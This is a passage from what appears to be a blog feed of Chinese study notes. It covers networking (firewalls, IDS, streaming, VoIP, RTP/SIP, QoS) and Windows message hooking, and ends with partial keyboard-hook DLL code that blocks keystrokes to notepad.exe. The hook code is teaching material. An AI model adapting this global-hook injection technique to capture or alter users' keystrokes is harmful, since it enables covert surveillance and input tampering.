TK）生成。使用PMK，无线客户和AP现在能够生成附加的、将用于通信的密钥。其中的关键是临时密钥，TK将被用于执行经无线链路向任意远程主机发送数据的链路级的加密。</li></ul><h2 id="运行安全性-防火墙和入侵检测系统"><a href="#运行安全性-防火墙和入侵检测系统" class="headerlink" title="运行安全性:防火墙和入侵检测系统"></a>运行安全性:防火墙和入侵检测系统</h2><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>防火墙是一个硬件和软件的结合体，它将一个机构的内部网络与整个因特网隔离开，允许一些数据分组通过而组织另一些分组通过。防火墙具有3个目标：</p><ul><li>从外部到内部和从内部到外部的所有流量都通过防火墙。</li><li>仅被授权的流量允许通过。</li><li>防火墙自身免于渗透。</li></ul><pre class="line-numbers language-none"><code class="language-none">防火墙能够分为3类：传统分组过滤器、状态过滤器和应用程序网关。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传统分组过滤器独立地检查每个数据报，然后基于管理员特定的规则决定该数据报应当允许通过还是应当丢弃。过滤决定通常基于下列因素：</p><ul><li>IP源或目的地址。</li><li>在IP数据报中的协议类型字段：TCP、UDP、ICMP、OSPF等。</li><li>TCP或UCP的源和目的端口。</li><li>TCP标志比特：SYN、ACK等。</li><li>ICMP报文类型。</li><li>数据报离开和进入网络的不同规则。</li><li>对不同路由器接口的不同规则。</li></ul><h3 id="入侵检测系统"><a href="#入侵检测系统" class="headerlink" title="入侵检测系统"></a>入侵检测系统</h3><p>状态过滤器通过用一张连接表来跟踪所有进行中的TCP连接</p><p>应用程序网关是一个应用程序特定的服务器，所有应用程序数据都必须通过它。</p><p>当观察到潜在恶意流量时产生告警的设备称为<code>入侵检测系统（Intrusion Detection System, IDS）</code>。滤除可疑流量的设备称为<code>入侵防止系统（Intrusion Prevention System, IPS）</code>。IDS系统大致可分为基于特征的系统和基于异常的系统。基于特征的IDS维护了一个范围广泛的攻击特征数据库。每个特征与一个入侵活动相关联的规则集。一个特征可能只是有关单个分组的特性列表，或者可能与一系列分组有关。基于异常的IDS系统最大的特点是它们不依赖现有攻击的以前知识。</p><h2 id="九、多媒体网络应用"><a href="#九、多媒体网络应用" class="headerlink" title="九、多媒体网络应用"></a>九、多媒体网络应用</h2><h3 id="视频的性质"><a href="#视频的性质" class="headerlink" title="视频的性质"></a>视频的性质</h3><p>视频的显著特点是高比特率</p><h3 id="音频的性质"><a href="#音频的性质" class="headerlink" title="音频的性质"></a>音频的性质</h3><p><code>脉冲编码调制（Pulse Code Modulation, PCM）</code>将模拟音频转换为数字信号：</p><ul><li>模拟音频信号首先以某种固定速率采样。每个采样值是一个任意的实数。</li><li>然后每个采样值被“四舍五入”为有限个数值中的一个。这种操作被称为量化。这些有限个数值通常是2的幂。</li><li>每个量化值由固定数量的比特表示。通过音频扬声器播放，这个数字信号则能够转换回来（也就是解码），形成一个模拟信号。然而，解码后的模拟信号仅是初始信号的近似，并且声音质量也许有明显的下降。通过增加采样速率和量化值的数量，解码信号能够更好地接近初始的模拟信号。因此，在解码信号的质量和比特率与数字信号存储空间存在一种折中。</li></ul><p>一种接近CD质量立体声音乐的流行压缩技术是MPEG 1第3层，更通常的叫法是MP3。MP3编码器通常能够压缩为许多不同的速率；128kbps是最常用的编码速率，并且能够产生非常小的声音失真。一种相关的标准是高级音频编码（Advanced Audio Coding, AAC）。</p><h3 id="多媒体网络应用的类型"><a href="#多媒体网络应用的类型" class="headerlink" title="多媒体网络应用的类型"></a>多媒体网络应用的类型</h3><p>多媒体应用可以分为三大类: <strong>流式存储音频/视频；会话式IP语音/视频；流式实况音频/视频。</strong></p><h4 id="流式储存音频和视频"><a href="#流式储存音频和视频" class="headerlink" title="流式储存音频和视频"></a>流式储存音频和视频</h4><p>流式存储视频具有三个关键的不同特色：</p><ul><li>流。在流式存储视频应用中，客户开始从服务器接收文件几秒之后，通常就开始播放视频。这意味着当客户正在从视频的一个位置开始播放时，与此同时正在从服务器接收该视频的后续部分。这种技术被称为流，它避免了在开始播放之前必须下载整个视频。</li><li>相互作用。因为媒体是预先录制的，用户可以对多媒体内容进行暂停、重新配置前进、重新配置倒退、快进等操作。从一个客户提出这种请求到该动作在客户端表现出来，可接收的响应时间应该小于几秒。</li><li>连续播放。一旦视频开始播放，它应该根据初始记录的时序进行。因此，为了在客户端播放，必须从服务器中及时接收数据；否则，用户经历视频帧停滞或帧跳过。</li></ul><h4 id="会话式IP语音和视频"><a href="#会话式IP语音和视频" class="headerlink" title="会话式IP语音和视频"></a>会话式IP语音和视频</h4><p>在因特网上的实时会话式语音通常称为因特网电话。也常被称为IP语音（Voice-over-IP, VoIP）</p><h4 id="流式实况音频和视频"><a href="#流式实况音频和视频" class="headerlink" title="流式实况音频和视频"></a>流式实况音频和视频</h4><p>流式实况音频和视频类似于传统的电台广播和电视，只是它通过因特网来传输而已。</p><h2 id="流式存储视频"><a href="#流式存储视频" class="headerlink" title="流式存储视频"></a>流式存储视频</h2><p>流式视频系统可分为三种类型：UDP流、HTTP流和适应性HTTP流</p><p>当视频开始到达客户时，客户不必立即开始播放，反而能够在应用程序缓存中建立该视频的储备。一旦客户建立起几秒“已缓存但尚未播放”的视频储备，客户就可以开始视频播放了。这种客户缓存具有两种重要的优点。第一，客户缓存能够吸收服务器到客户时延中的波动。第二，如果服务器到客户带宽暂时低于视频消耗速率，用户能够继续享受连续的播放，只要客户应用缓存仍没有完全排尽</p><h3 id="UDP流"><a href="#UDP流" class="headerlink" title="UDP流"></a>UDP流</h3><p>使用UDP流，服务器通过UDP以一种稳定的速率记录下视频块，用于哭护的视频消耗速率向匹配的速率传输视频。在将视频块传递给UDP之前，服务器将视频块封装在运输分组中，该运输分组是专门为传输音频和视频而设计的，使用了实时传输协议（Real-Time Transport Protocal, RTP）或某种类似的方案。UDP流的另一种不同的性质是，除了服务器到客户的视频流外，两者间还并行地维护一个单独的控制连接，通过该连接，客户可发送有关会话状态变化的命令。</p><p>UDP流有三个重大不足。首先，由于服务器和控制之间的可用带宽无法预测并且是变化的，恒定速率UDP流不能够提供连续的播放。第二个缺点是它要求如RTSP服务器这样的媒体控制服务器，以对每个进行中的客户会话处理客户到服务器的交互请求和跟踪客户状态。这增加了部署大规模的按需视频系统的总体成本和复杂性。第三个缺点是许多防火前配置为阻塞UDP流量，防止这些防火墙后面的用户接收UDP视频</p><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>在HTTP流中，视频直接作为具有一个特定URL的普通文件存储在HTTP服务器上。当用户要看视频时，客户和服务器之间建立一个TCP连接，并且发送一个对该URL的HTTP GET请求。服务器则尽可能快地在HTTP响应报文中发送该视频文件。在客户端上，字节收集在一个客户应用缓存中。一旦在缓存中字节数量超过了预先设定的阈值，该客户应用程序开始播放，具体而言，它周期性地从客户应用缓存中抓取视频帧，对帧解压缩并在用户屏幕上显示它们。</p><p>在TCP上使用HTTP也使得视频穿越防火墙和NAT更为容易。HTTP流消除了因需要媒体服务器带来的不便，减少了在因特网上大规模部署的成本。</p><p>对于流式存储视频，客户能够尝试以高于消耗速率的速率下载视频，因此预取将来会被消耗的视频帧。该预取的视频当然存储在客户应用缓存中。</p><p>当网络中可用速率小于视频速率时，播放将在连续播放期和停滞播放期之间进行变动。当网络中的可用速率大于视频速率时，在初始缓存时延后，用户将享受连续的播放直到视频结束。</p><h2 id="IP语音"><a href="#IP语音" class="headerlink" title="IP语音"></a>IP语音</h2><p>经因特网的实时会话式语音经常被称为因特网电话，通常称为IP语音（VoIP）</p><h3 id="尽力而为服务限制"><a href="#尽力而为服务限制" class="headerlink" title="尽力而为服务限制"></a>尽力而为服务限制</h3><p>因特网的网络层协议提供尽力而为的服务</p><h4 id="端到端延时"><a href="#端到端延时" class="headerlink" title="端到端延时"></a>端到端延时</h4><p>端到端时延得到一个关键成分是一个分组在网络路由器中经历的变化的排队时延。由于这些可变的时延，从在源中产生分组到它在接收方收到的这段时间，对于不同的分组可能会有波动。这个现象称为时延抖动。</p><h3 id="在接收方消除音频的时延抖动"><a href="#在接收方消除音频的时延抖动" class="headerlink" title="在接收方消除音频的时延抖动"></a>在接收方消除音频的时延抖动</h3><h4 id="分组时延抖动"><a href="#分组时延抖动" class="headerlink" title="分组时延抖动"></a>分组时延抖动</h4><p>对于VoIP应用，周期性地产生分组，接收方应该在存在随机网络时延抖动的情况下尝试提供播放语音块。这经常通过结合下面两种机制来实现：</p><ul><li>为每个块预先计划一个时间戳。发送方用每个块产生的时刻为它加上时间印记。</li><li>在接收方延迟播放块。接收的音频块的播放时延必须足够长，以便大多数分组在它们的预定播放时间之前被接收到。这个播放时延可能在整个音频会话期间是固定的，或者在音频会话生命期中适应性地变化。</li></ul><h5 id="固定播放时延"><a href="#固定播放时延" class="headerlink" title="固定播放时延"></a>固定播放时延</h5><p>使用固定播放时延策略，接收方试图在块产生正好q ms后播放它。因此如果一个块在时刻t打上时间戳，接收方在时刻t + q播放这个块，假设这个块在那个时间已经到达。在预定播放时间之后到达的分组将被丢弃，并被认为已经丢失。</p><h5 id="适应性播放时延"><a href="#适应性播放时延" class="headerlink" title="适应性播放时延"></a>适应性播放时延</h5><p>ti = 第i个分组的时间戳 = 该分组在发送方产生的时间</p><p> ri = 分组i被接收方接收的时间</p><p> pi = 分组i在接收方播放的时间</p><p>第i个分组的端到端网络时延是ri – ti。由于网络时延抖动，这个时延在不同的分组之间会发送变化。令di表设计接收到第i个分组时的平均网络时延的估计值。这个估计值根据如下的时间戳来构造：</p><p>式中u是一个固定的常数。这样di是观察到的网络时延r1 – t1, …, ri - ti的一个平滑均值。这个估计值为最近观察到的网络时延设置了比过去一段时间观察到的网络时延有更大的权重。令vi表示于估计平均时延的平均时延绝对偏差的估计值。这个估计值也可从这些时间戳构建：</p><p> 为每个接收的分组计算估计值di和vi，尽管它们仅能用于为任何话音突峰期的第一个分组确定播放点。</p><p> 一旦计算完了这些估计值，接收方为分组播放应用下列的算法。如果分组i是一个话音突峰期的第一个分组，它的播放时间pi计算如下：</p><p>这里K是一个正的常数。Kvi项的目的是给将来设置足够大的播放时间，以便话音突峰期中只有一小部分到达的分组由于迟到而丢失。在一个话音突峰期中任何后续分组的播放点被计算为对于这个话音突峰期的第一个分组播放时间点的偏移。</p><p>表示从话音突峰期的第一个分组产生到它播放的时间长度。如果分组j也属于这个话音突峰期，它播放的时刻是</p><h3 id="从丢包中恢复"><a href="#从丢包中恢复" class="headerlink" title="从丢包中恢复"></a>从丢包中恢复</h3><p>丢包恢复方案有前向纠错（Forward Error Correction, FEC）与交织。</p><h4 id="向前纠错"><a href="#向前纠错" class="headerlink" title="向前纠错"></a>向前纠错</h4><p>FEC的基本思想是给初始的分组流增加冗余信息。以稍微增加传输速率为代价，这些冗余信息可用用来重建一些丢失分组的近似或者准确版本。第一种机制是每发送n个块之后发送一个冗余编码的块。这个冗余块通过异或n个初始块来获得。以想和中方式，在这n + 1个分组的组中，如果任何一个分组丢失，接收方能够完全重建丢失的分组。但是如果这一组中有两个或更多分组丢失，接收方则无法重建丢失的分组。通过让组的长度n + 1比较小，当丢失不是很多时，大部分丢失分组都可以恢复。然而组的长度越小，相对增加的传输速率就越大。</p><p>第二个FEC机制是发送一个较低分辨率的音频流作为冗余信息。发送方可能创建一个标称的音频流和一个相应的低分辨率、低比特率的音频流。这个低比特率流被认为是冗余信息。发送方通过从流中取出第n个块并附加上第n – 1个块的冗余信息，以构建第n个分组。以这种方式，只要没有连续分组的丢失，接收方都可以通过播放和后续分组一起到达的低比特率编码来隐藏丢失。当然，低比特率块比标称块的质量要低。然而，在一个流主要是由高质量块组成、偶尔出现低质量块并且没有丢失块的情况下，其整体的音频质量良好。在这种方案中，接收方在播放前只需接收两个分组，因此增加的时延小。此外，如果低比特率编码比标称编码少得多，那么传输速率的额外增加并不大。</p><h4 id="交织"><a href="#交织" class="headerlink" title="交织"></a>交织</h4><p>作为冗余传输的另一种替代方案，VoIP应用可以发送交织的音频。发送方在传输之前对音频数据单元重新排序，使得最初相邻的单元在传输流中以一定距离分离开来。交织可以减轻丢包的影响。一个交织流的单个丢包导致重建流中的多个小间隙，这与在非交织流中将会导致单个大间隙形成对照。</p><p>交织能够明显地提高音频流可感觉到的质量。它的开销也较低。交织明显的缺点是增加了时延。这限制了它在如VoIP这样的会话式应用中的使用，然而它能够很好地处理流式存储音频。交织的一个主要优点是它不增加流的带宽要求。</p><h4 id="差错掩盖"><a href="#差错掩盖" class="headerlink" title="差错掩盖"></a>差错掩盖</h4><p>差错掩盖方案试图为丢失的分组产生一个与初始分组类似的替代物。因为音频信号（特别是语音）呈现出大量的短期自相似性，故该方案是可行的。这些技术适合于工作在相对小的丢包率和小分组的情况。基于接收方的恢复的最简单方式是分组重复。即用在丢失之前刚到达的分组的副本来代替丢失的分组。这种方法的计算复杂度低，并且工作得相当好。基于接收方恢复的另一种形式的内插法，它使用在丢失之前和之后的音频内插形成一个合适分组来隐藏丢失。内插法比分组重复稍微好一些，但是显然需要更高的计算强度。</p><h2 id="实时会话式应用的协议"><a href="#实时会话式应用的协议" class="headerlink" title="实时会话式应用的协议"></a>实时会话式应用的协议</h2><h3 id="RTP"><a href="#RTP" class="headerlink" title="RTP"></a>RTP</h3><p><code>实时传输协议（Real-Time Transport Protocol, RTP）</code>通常运行在UDP之上。发送端在RTP分组中封装媒体块，然后再UDP报文段中封装该分组，然后将该报文段递交给IP。接收端从UDP报文段中提取出这个RTP分组，然后从RTP分组中提取出媒体块，并将这个块传递给媒体播放器来解码和呈现。</p><h4 id="RTP基础"><a href="#RTP基础" class="headerlink" title="RTP基础"></a>RTP基础</h4><p>发送端在每个语音数据块的前面加上一个RTP首部，这个首部包括音频编码的类型、序号和时间戳。RTP首部通常是12字节。音频块和RTP首部一起形成RTP分组。然后向UDP套接字接口发送该RTP分组。在接收端，应用程序从它的套接字接口收到该RTP分组，从RTP分组中提取出该音频块，并且使用RTP分组的额首部字段来适当地解码和播放该音频块</p><h4 id="RTP分组首部字段"><a href="#RTP分组首部字段" class="headerlink" title="RTP分组首部字段"></a>RTP分组首部字段</h4><p>RTP分组中的有效载荷类型字段的长度是7比特。对于音频流，有效载荷类型字段用于指示所使用的音频编码类型。如果发送方在会话过程中决定改变编码，发送方可以通过该有效载荷类型字段来通知接收方这种变化。发送方可能要通过改变该编码来提高语音质量或者减小RTP流比特率。</p><p>当前RTP支持的一些音频有效载荷类型。</p><p>对于一个视频流，有效载荷类型用于指示视频编码类型。发送方也可以在会话期间动态改变视频编码。</p><h3 id="SIP"><a href="#SIP" class="headerlink" title="SIP"></a>SIP</h3><p>会话发起协议（Session Initiation Protocol, SIP）是一个开放和轻型的协议，其功能如下：</p><ul><li>提供了在主叫者和被叫者之间经IP网络创建呼叫的机制。它允许主叫者通知被叫者它要开始一个呼叫。它允许参与者约定媒体编码，也允许参与者结束呼叫。</li><li>提供了主叫者确定被叫者的当前IP地址的机制。因为用户可能动态地分配到地址，而且因为它们可能有多个IP设备，每个都有一个不同的IP地址，所以用户不具有单一的、固定的IP地址。</li><li>提供二零用于呼叫管理的机制，这些机制包括在呼叫期间增加新媒体流、在呼叫期间改变编码、在呼叫期间邀请新的参与者、呼叫转移和呼叫保持等。</li></ul><p>SIP的特性</p><ul><li>SIP是一个带外协议，即发送和接收SIP报文使用了一个不同于发送和接收媒体数据的套接字。</li><li>SIP报文本身是可读的ASCII，这于HTTP报文类似。</li><li>SIP要求所有的报文都要确认，因此它能够在UDP或者TCP上运行。</li></ul><p>SIP注册器把固定的人识别标志翻译为一个动态的IP地址。</p><h2 id="支持多媒体的网络"><a href="#支持多媒体的网络" class="headerlink" title="支持多媒体的网络"></a>支持多媒体的网络</h2><p><strong>三种网络层方法：</strong></p><ul><li>区分服务。使用区分服务，当两类流量在一台路由器中排队时，一种类型的流量可以给定严格的优于另一种类型的流量的优先权。</li><li>每连接服务质量（QoS）保证。使用每连接QoS保证，每个应用的实例显式地预约端到端带宽，并因此具有确保的端到端性能。硬保证意味着应用将必定接收到它所请求的服务质量。软保证意味着应用将以高概率接收到它所请求的服务质量。</li><li>尽可能利用尽力而为的服务</li></ul><h3 id="定制尽力而为网络"><a href="#定制尽力而为网络" class="headerlink" title="定制尽力而为网络"></a>定制尽力而为网络</h3><p>对需要提供多种类型流量机制的见解：</p><ul><li>标记分组使得路由器区分属于不同类型流量的分组。</li><li>希望在流量类型之间的提供流量隔离的度，以便一类流量不会收到另一类流量的负面影响。</li><li>当为流量类型或流之间提供隔离时，希望尽可能有效地使用资源。</li></ul><h3 id="提供多种类型的服务"><a href="#提供多种类型的服务" class="headerlink" title="提供多种类型的服务"></a>提供多种类型的服务</h3><p>3个重要的监管准则：</p><ul><li>平均速率。网络可能希望限制一个流的分组能够发送到网络中的长期平均速率。这里一个关键的问题是监管平均速率的时间间隔。一个平均速率被限制为美妙100个分组的流要比一个每分钟6000个分组的源收到的约束更严格，即使在一个足够长的时间间隔上它们有相同的平均速率。</li><li>峰值速率。平均速率约束限制了一个相对长的时间内能够发送到网络中的流量，而峰值约束限制了一个较短时间内能够发送的最大分组数。</li><li>突发长度。网络也许还希望限制极端的时间间隔内能够发送到网络中的最大分组数。</li></ul><p><strong>漏桶机制</strong> 是一个能够用来表征这些监管限制的抽象。漏桶由一个能够容纳b个令牌的桶组成。令牌加进桶的过程如下。可能潜在地加入桶中的新令牌总是以每秒r个令牌的速率产生。当产生一个令牌时，如果桶填充得少于b个令牌，新产生的令牌加入到该桶中；否则忽略该新产生的令牌，令牌桶保持具有b个令牌的满状态。假设在一个分组流向网络传输之前，必须首先从令牌桶中去除一个令牌。。如果令牌桶是空的，分组必须等待一个令牌。因为在桶中最多能由b个令牌，所以漏桶监管的流的最大突发长度是b个分组。此外，因为令牌产生的速率是r，所以在任何长度为t的时间间隔内能够进入网络中的最大分组数目为rt + b。因此，令牌产生速率r用于限制分组能够进入网络的长期平均速率。</p><p>在加权公平排队（WFQ）规则中，每个流i保证收到至少等于R ∙ wi / (∑wj)的共享链路带宽，其中R是以分组/秒为单位的链路传输速率。当将漏桶机制于WFQ结合时，假设流i的令牌桶最初是满的。然后b个分组的突发到达流i的漏桶监管器。这些分组取出了漏桶中的所有令牌，然后加入了流i的WFQ等待区域。因为这b个分组以至少R ∙ wi / (∑wj)分组/秒的速度得到服务，直到这些分组的最后一个传输完成，所以将由最大时延dmax</p><h3 id="区分服务"><a href="#区分服务" class="headerlink" title="区分服务"></a>区分服务</h3><p>因特网区分服务（Diffserv）体系结构提供服务区分，也就是在因特网中以一种可扩展性方式用不同的方法处理不同类型流量的能力。区分服务体系结构由两个功能元素的集合所组成：</p><ul><li>边界功能：分组分类和流量调节。在网络的入边缘，到达的分组被标记。更具体地说，在IPv4或者IPv6分组首部中的区分服务（DS）字段被设置为某个值。分组得到的标记标识了该分组所属的流量类型。然后不同类型的流量将在核心网络得到不同的服务。</li><li>核心功能：转发。当一个DS标记的分组到达一个Diffserv使能的服务器时，根据与分组类型相关的所谓的每跳行为（Per-Hop Behavior, PHB），该分组被转发到它的下一跳。每跳行为影响在竞争的流量类型之间共享路由器缓存和链路带宽的方式。Diffserv体系结构的一个关键原则是路由器的每跳行为只基于分组标记，即分组所属的流量类型。</li></ul><h3 id="资源预约和呼叫准入"><a href="#资源预约和呼叫准入" class="headerlink" title="资源预约和呼叫准入"></a>资源预约和呼叫准入</h3><p>已经定义了两种PHB：加速转发（Expedited Forwarding, EF）PHB规定了一类流量离开路由器的速率必须等于或者大于某个已配置的速率。确保转发（Assured Forwarding, AF）PHB将流量分为4类，其中每个AF类都确保提供某种最小数量的带宽和缓存。</p><p>让流申告它的QoS需求，然后让网络接收该流或者阻塞该流的过程称为呼叫准入过程。如果不总是能够提供充分的资源，并且要确保QoS，则需要一个呼叫准入过程，在这个过程中流申告其QoS需求，然后要么被网络准入，要么被网络阻塞。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows消息钩取</title>
      <link href="/2019/08/22/windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/"/>
      <url>/2019/08/22/windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。</p><h2 id="windows消息机制"><a href="#windows消息机制" class="headerlink" title="windows消息机制"></a>windows消息机制</h2><p>windows是一个消息驱动式系统。windows消息提供在应用程序与应用程序之间，应用程序与windows系统之间通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。</p><p>进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动,进程是系统进行资源分配和调度的一个独立单位。</p><p>进程可以看做程序执行的一个实例。进程是系统资源分配的独立实体，每个进程都有独立的地址空间。一个进程可以拥有多个线程，每个线程使用其所属进程的栈空间。同一进程内的多个线程可以共享部分状态，多个线程可以读写同一块内存，进程无法访问其他进程的内存。</p><pre class="line-numbers language-none"><code class="language-none">线程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>线程是进程的一个实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位。是进程的一条执行路径。</p><p>线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源,但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源.。</p><ul><li>进程是一个容器，线程在进程这个容器中执行，是实际执行的代码。一 个进程至少拥有一个线程，而这个线程通常被称之为主线程，主线程的入口点也是应用程序的起始点。线程除了必不 可少的资源（程序计数器 一组寄存器和栈）之外，不拥有系统资源，所有进程内 的线程共享分配给这个进程拥有的所有资源。</li></ul><pre class="line-numbers language-none"><code class="language-none">事件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在操作系统中借助键盘，鼠标，选择菜单，按钮，以及移动鼠标，改动窗口大小和位置都是事件。</p><pre class="line-numbers language-none"><code class="language-none">句柄<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>句柄在程序设计中是一种特殊的指针，当一个程序需要引用其他系统时，就要使用句柄。</p><p>句柄是windows编程的基础。一个句柄是指使用一个唯一的整数值（4字节，64位 程序中是8字节），来标识应用程序中的不同对象和同类中的不同实例。</p><h2 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h2><ul><li>钩子（Hook）是windows消息处理机制的一个平台，应用程序可以在上面设置子进程以监视指定窗口的某种消息，监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它，钩子机制允许应用程序截获处理windows消息或特定事件。</li><li>钩子是一个处理消息的程序段，通过系统调用，把他们挂入系统。当特定的消息发出，在没有达到目的窗口前，钩子程序就先捕获该消息，钩子函数先得到控制权，就可以加工处理或改变消息，也可以不处理继续传递消息，也可强制结束消息。</li></ul><h2 id="常规windows消息流"><a href="#常规windows消息流" class="headerlink" title="常规windows消息流"></a>常规windows消息流</h2><p>1.发生键盘输入时，WM_KEYDOMN消息被添加到[OS message queue]</p><p>2.OS判断那个应用发生了事件，然后从[OS message queue]取出消息，添加到相应的[application message queue]中。</p><p>3.应用程序监视自身的[application message queue]，发现新添加的WM_KEYDOMN消息后，调用相应的事件处理程序处理。</p><h2 id="消息钩取工作原理"><a href="#消息钩取工作原理" class="headerlink" title="消息钩取工作原理"></a>消息钩取工作原理</h2><p>windows操作系统向用户提供GUI（ 图形用户界面），以事件驱动的方式工作。<br>当事件发生时，OS会把事先定义好的消息发送给响应的应用程序，应用程序收到消息后执行相应的动作。</p><p>OS消息队列与应用程序消息队列之间存在一条钩链（HookChain）处于钩链的钩子会比应用程序先看到相应的信息。在键盘钩子函数的内部，除了可以查看消息外，还可以修改消息本身，对消息拦截或阻止消息传递。可以同时设置多个键盘钩子，按照设置顺序依次调用这些钩子</p><p><img src="/2019/08/22/windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/image-20250921174410738.png"></p><h2 id="windows消息钩取的实现——SetWindowsHookEx"><a href="#windows消息钩取的实现——SetWindowsHookEx" class="headerlink" title="windows消息钩取的实现——SetWindowsHookEx()"></a>windows消息钩取的实现——SetWindowsHookEx()</h2><p>使用SetWindowsHookEx()API可以轻松实现消息钩子</p><pre class="line-numbers language-none"><code class="language-none">SetWindowsHookEx（）API定义<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">HHOOK <span class="token function">SetWindowsHookEx</span><span class="token punctuation">(</span>    <span class="token keyword">int</span> idHook<span class="token punctuation">,</span><span class="token comment">//hook type</span>    HOOKPROC lpfn<span class="token punctuation">,</span><span class="token comment">//hook procedure</span>    HINSTANCE hMod<span class="token punctuation">,</span><span class="token comment">//hook procedure所属的DLL句柄</span>    DWORD dwThreadId<span class="token comment">//将要挂钩的目标线程ID</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>idHook：</code> 指示将要安装的挂钩处理过程的类型</p><p><code>Lpfn：</code> 消息的回调函数地址</p><p><code>hMod：</code> 钩子函数所在的实例的句柄。对于线程钩子，该参数为NULL。对于系统钩子，该参数为钩子函数所在的DLL句柄</p><p><code>dwThreadId：</code> 钩子所监视的线程的线程号，可通过GetCurrentThreadId()获得线程号。若dwThreadId参数设置为0，安装的钩子时全局钩子（Global Hook）</p><p>钩子过程是由操作系统调用的回调函数。安装钩子时，钩子过程需要存在某个DLL的内部，这个DLL的实例句柄是hMod</p><p>使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS会将相关的DLL文件强制注入相应的进程，然后调用注册的钩子过程。</p><h2 id="键盘消息钩子"><a href="#键盘消息钩子" class="headerlink" title="键盘消息钩子"></a>键盘消息钩子</h2><h3 id="Keyhook-cpp"><a href="#Keyhook-cpp" class="headerlink" title="Keyhook.cpp"></a>Keyhook.cpp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"windows.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEF_PROCESS_NAME</span><span class="token string">"notepad.exe"</span></span>HINSTANCE g_hInstance <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>HHOOK g_hHook <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>HWND g_hWnd <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HINSTANCE hinstDLL<span class="token punctuation">,</span> DWORD dwReason<span class="token punctuation">,</span> LPVOID lpvReserved<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>dwReason<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>g_hInstance <span class="token operator">=</span> hinstDLL<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">}</span>LRESULT CALLBACK <span class="token function">KeyboardProc</span><span class="token punctuation">(</span><span class="token keyword">int</span> nCode<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> szPath<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nCode <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// bit 31 : 0 =key press, 1 =key release</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>lParam <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//释放键盘按键时</span><span class="token punctuation">{</span><span class="token function">GetModuleFileNameA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> szPath<span class="token punctuation">,</span> MAX_PATH<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>szPath<span class="token punctuation">,</span> <span class="token char">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//比较当前进程名称，若为notepad.exe,则消息不会传给应用程序</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">_stricmp</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> DEF_PROCESS_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token 